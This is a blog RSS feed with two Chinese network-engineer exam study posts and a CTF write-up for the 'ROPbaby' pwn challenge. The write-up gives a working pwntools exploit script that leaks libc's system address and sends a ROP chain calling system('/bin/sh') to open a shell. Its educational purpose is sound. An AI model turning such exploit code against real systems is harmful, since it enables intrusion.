<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Listone Blog</title>
    <description>Learning day by day, progressing day by day!</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sun, 28 Jul 2019 16:57:35 +0800</pubDate>
    <lastBuildDate>Sun, 28 Jul 2019 16:57:35 +0800</lastBuildDate>
    <generator>Jekyll v3.8.6</generator>
    
      <item>
        <title>第02课：数据通信基础（一）</title>
        <description>&lt;h1 id=&quot;第02课数据通信基础一&quot;&gt;第02课：数据通信基础（一）&lt;/h1&gt;

&lt;h2 id=&quot;1-数据通信基本概念&quot;&gt;1. 数据通信基本概念&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点01：&lt;/strong&gt; 基本概念:信源、信道、信宿;数字信号、模拟信号;模拟通信、数字通信(信道中传送)。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g5fm16hj7cj30km08dmyp.jpg&quot; alt=&quot;通信系统模型&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-数据通信计算&quot;&gt;2. 数据通信计算&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点02：&lt;/strong&gt; 模拟信道带宽计算:W=f2-f1,其中f1是低频,f2是高频。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g5fm1e7ng0j30hv0a90ts.jpg&quot; alt=&quot;模拟信道的带宽&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点03：&lt;/strong&gt; 数字信道带宽计算:奈奎斯特定理(无噪声)&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;奈奎斯特定理: $B=2W$ ($W$为带宽、$B$码元速率、波特率)，信息量$n$(位)与码元种类$N$: $n= log_2{N}$ ，数据速率 $R= Bn = Blog_2{N} = 2Wlog_2{N}$&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;考点04：&lt;/strong&gt; 数字信道带宽计算:香农定理(有噪声)&lt;/li&gt;
  &lt;li&gt;香农定理：$C = Wlog_2{(1+\frac{S}{N})}$&lt;/li&gt;
  &lt;li&gt;其中,$C$为数据速率,$W$为信道带宽,$S$为信号的平均功率,$N$为噪声平均功率,$S/N$为信噪比。&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;信噪比和分贝数:$dB=10lg(S/N)$&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;考点05：&lt;/strong&gt; 计算汇总:模拟带宽、数字带宽(1、无噪声:奈奎斯特定理,2、有噪声:香农定理&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g5fm1l3sbnj30kx0avjtu.jpg&quot; alt=&quot;信道的数据速率计算公式&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点06：&lt;/strong&gt; 常用考试数据：&lt;/li&gt;
  &lt;li&gt;单位换算：通信换算进率1000,如1G=1000M，存储换算进率1024,如1G=1024M&lt;/li&gt;
  &lt;li&gt;信道延迟：电缆信道延迟200m/us (200km/ms,200000km/s)&lt;/li&gt;
  &lt;li&gt;卫星信道延迟：270ms&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;通信传输介质&quot;&gt;通信传输介质&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点07：&lt;/strong&gt; 双绞线:分为非屏蔽双绞线UTP,屏蔽双绞线STP。100米可以达到100Mb/s。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5fm1rmsn5j30kf0aa40o.jpg&quot; alt=&quot;各种规格的双绞线&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g5fm1yia6lj30l80cm77k.jpg&quot; alt=&quot;双绞线水晶头&quot; /&gt;
&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g5fm27yqrij30lc0ccdkg.jpg&quot; alt=&quot;交叉线和直通线适用范围&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点08：&lt;/strong&gt; 同轴电缆:分为粗同轴电缆、细同轴电缆。传送距离长,信号稳定,常用语电视、监视系统,音响设备传送音、视频信号。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g5fm2er47wj30gw07hmzq.jpg&quot; alt=&quot;同轴电缆&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点09：&lt;/strong&gt; 光纤(光缆):分为单模光纤SMF(左图)、多模光纤MMF(右图)。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g5fm2kjx8hj30ks099n0c.jpg&quot; alt=&quot;光纤&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点10：&lt;/strong&gt; 区别对比:单(身)美女的眼光:高贵细远&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g5fm2t9wnnj30ln09n0w3.jpg&quot; alt=&quot;单模光纤与多模光纤的比较&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点11：&lt;/strong&gt; 无线信道:分为无线电波和红外光波。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g5fm3izytqj30k90ac417.jpg&quot; alt=&quot;无线信道&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-数据调制与编码&quot;&gt;4. 数据调制与编码&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点12：&lt;/strong&gt; 模拟信道调制:分为调幅ASK、调频FSK、调相PSK、正交调幅QAM。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5fm3reawfj30l30a2djd.jpg&quot; alt=&quot;三种调制方式&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点13：&lt;/strong&gt; 数字信道编码:分为采样(2倍)、量化(等级)、编码(二进制)三个步骤。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g5fm3xbbdhj30lg08tae2.jpg&quot; alt=&quot;信道编码&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点14：&lt;/strong&gt; 调制技术与码元数:$n=log_2{N}$&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g5fm44w6knj30km0apmzf.jpg&quot; alt=&quot;调制技术与码元数&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点15：&lt;/strong&gt; 极性编码:分为单极性、极性、双极性。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g5fm4fzpw4j30k509tdix.jpg&quot; alt=&quot;极性编码&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点16：&lt;/strong&gt; 归零性编码:归零码、不归零码(遇1翻转)。双相码(电平翻转)。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g5fm4n4g9rj30jn09iwhn.jpg&quot; alt=&quot;归零性编码&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点17：&lt;/strong&gt; 曼码和差分曼码:曼码降0升1(降升0)效率50%;差分曼码折0平1,效率50%。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5fm4se70mj30kt084gof.jpg&quot; alt=&quot;曼彻斯特&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点18：&lt;/strong&gt; 各种编码效率：4B/5B效率80%,用于百兆以太网；8B/10B效率80%,用于千兆以太网；64B/66B效率97%,用于万兆以太网；曼码和差分曼码效率50%,用于以太网。&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sun, 28 Jul 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019/07/28/%E7%AC%AC02%E8%AF%BE-%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80-%E4%B8%80/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/07/28/%E7%AC%AC02%E8%AF%BE-%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80-%E4%B8%80/</guid>
        
        <category>网络工程师</category>
        
        <category>Notes</category>
        
        
      </item>
    
      <item>
        <title>第01课：计算机网络概论</title>
        <description>&lt;h1 id=&quot;第01课计算机网络概论&quot;&gt;第01课：计算机网络概论&lt;/h1&gt;

&lt;h2 id=&quot;1-计算机网络概念&quot;&gt;1. 计算机网络概念&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点01：&lt;/strong&gt; 计算机网络是通过通信线路和通信设备连接的许多的分散独立工作的计算机系统，遵从一定的协议用软件实现资源共享的系统。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;考点02：&lt;/strong&gt; 组成分为硬件、软件、协议三部分。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;考点03：&lt;/strong&gt; 协议扥为国际标准OSI/RM和公认标准TCP/IP。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;2-计算机网络分类&quot;&gt;2. 计算机网络分类&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;考点04：&lt;/strong&gt; （1）按分布范围：分为局域网、城域网、广域网。（2）按拓扑结构：分为星型、环型、树型等。（3）其他分类：公用网与专用网；通信网ISP与信息网ICP；校园网与企业网；骨干网与接入网；有线网与无线网等。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;3-网络体系结构ositcpip&quot;&gt;3. 网络体系结构OSI、TCP/IP&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;考点05：&lt;/strong&gt; OSI/RM(开放系统互联参考模型)七层是应用层、表示层、会话层、传输层、网络层、数据链路层、物理层。
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g5etqkrmtrj30i80asafp.jpg&quot; alt=&quot;OSI七层协议结构&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;考点06：&lt;/strong&gt; TCP/IP(因特网传输协议)四层是应用层、传输层、互联网层、网络接口层。
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g5etqp0og2j30db0brmzx.jpg&quot; alt=&quot;TCP/IP四层协议结构&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;考点07：&lt;/strong&gt; 七层OSI和四层TCP/IP协议对比
&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g5etqvmv7pj30il0afn1k.jpg&quot; alt=&quot;OSI模型与TCP/IP模型对比&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;考点08：&lt;/strong&gt; 七层协议各层实现功能如下表。
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g5etr3grgaj30iw094qab.jpg&quot; alt=&quot;七层协议各层功能&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;考点09：&lt;/strong&gt; 网络数据传输整个过程——数据封装
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g5etr9d8swj30hs09v44q.jpg&quot; alt=&quot;数据封装&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;网络数据传输整个过程——数据传输
&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5etrcpjz6j30h609tgop.jpg&quot; alt=&quot;数据传输&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;网络数据传输整个过程——数据解封
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g5etrhudwdj30i90a4dlw.jpg&quot; alt=&quot;数据解封&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sat, 27 Jul 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019/07/27/%E7%AC%AC01%E8%AF%BE-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%AE%BA/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/07/27/%E7%AC%AC01%E8%AF%BE-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%AE%BA/</guid>
        
        <category>网络工程师</category>
        
        <category>Notes</category>
        
        
      </item>
    
      <item>
        <title>实验吧ROPbaby(PWN)</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;本文首发于博主公众号LISTONE，欢迎关注哦！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;题目链接：&lt;a href=&quot;http://www.shiyanbar.com/ctf/2028&quot;&gt;ROPbaby&lt;/a&gt;
（没想到题目服务器挂掉了，只能本地做了）&lt;/p&gt;

&lt;p&gt;这个题目给了我们两个文件一个ROPbaby，一个libc。&lt;/p&gt;

&lt;p&gt;首先查看ropbaby的文件信息和保护方式。&lt;/p&gt;

&lt;p&gt;在这里可以看到程序开启了NX，这样的话shellcode的方式就很难用了，因此我们用ROP的方法来溢出攻击。&lt;/p&gt;

&lt;p&gt;ROP的思路就是通过返回导向式编程，劫持程序的返回地址，将其定位到目标位置，在CTF中，我们一般都是劫持程序运行&lt;code class=&quot;highlighter-rouge&quot;&gt;system('/bin/sh')&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;这个程序通过上面的信息可以知道是64位的，在64位程序中，函数调用时，前六个参数是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;r8&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;r9&lt;/code&gt;来进行传递的，我们的目的是劫持程序执行&lt;code class=&quot;highlighter-rouge&quot;&gt;system('/bin/sh')&lt;/code&gt;这个语句。&lt;/p&gt;

&lt;p&gt;因此，我们需要做的就是：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;找到溢出点&lt;/li&gt;
  &lt;li&gt;构造gadget，包含&lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi | retn&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;在libc中找到&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;字符串的地址，并送入&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;寄存器&lt;/li&gt;
  &lt;li&gt;找到&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数地址，并使程序跳转执行&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;通过题目中给出的libc文件，我们可以轻易地在终端中使用如下命令找到&lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi | retn&lt;/code&gt;的地址&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ROPgadget --binary libc-2.23.so --only &quot;pop|ret&quot; |grep &quot;pop rdi&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;结果如下：&lt;br /&gt;
&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5dnsj933cj30gx02gmxx.jpg&quot; alt=&quot;ROPgadget&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们需要着重记住上面我框住的那个地址。&lt;/p&gt;

&lt;p&gt;找溢出点：
在程序中有一个&lt;code class=&quot;highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;函数如下：&lt;br /&gt;
&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5dnslmgusj308301d745.jpg&quot; alt=&quot;memcpy&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其中&lt;code class=&quot;highlighter-rouge&quot;&gt;savedergs&lt;/code&gt;是以&lt;code class=&quot;highlighter-rouge&quot;&gt;int64&lt;/code&gt;声明的，因此最多可输入8个字符，之后多输入就会溢出，这个地方就是我们要找的溢出点了。&lt;/p&gt;

&lt;p&gt;然后在libc中找到&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;的地址，用下面的命令就可以：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings -tx libc-2.23.so|grep &quot;/bin/sh&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5dnsp9s5mj30am0193yj.jpg&quot; alt=&quot;/bin/sh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在这个程序中可以直接查找&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数的地址，但是我们需要找到程序的基址，所以我们需要找到&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;的偏移地址。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; objdump -T libc-2.23.so|grep &quot;system&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g5dnssdtqnj30jp02ddh1.jpg&quot; alt=&quot;objdump&quot; /&gt;
这里面0x45390就是&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数的地址&lt;/p&gt;

&lt;p&gt;所以，我们可以写出利用脚本：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env/python 
# coding=utf-8 
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;  
&lt;span class=&quot;c1&quot;&gt;#context.log_level = &quot;debug&quot;  
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;  
&lt;span class=&quot;c1&quot;&gt;#p = remote('106.2.25.7','8004')  
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ropbaby'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;pop_rdi_ret_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21102&lt;/span&gt;  
  
&lt;span class=&quot;n&quot;&gt;str_bin_sh_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18cd17&lt;/span&gt;  

&lt;span class=&quot;n&quot;&gt;system_addr_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x45390&lt;/span&gt;  
  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Enter symbol: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  
&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[+]system_addr: '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  

&lt;span class=&quot;n&quot;&gt;base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr_offset&lt;/span&gt;  
  
&lt;span class=&quot;n&quot;&gt;str_bin_sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str_bin_sh_offset&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]binsh: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_bin_sh_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;rdi_ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_ret_offset&lt;/span&gt;  
  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Enter bytes to send (max 1024): '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_bin_sh_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  
&lt;span class=&quot;c1&quot;&gt;# p.sendline(str(len(payload)))  
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'32'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
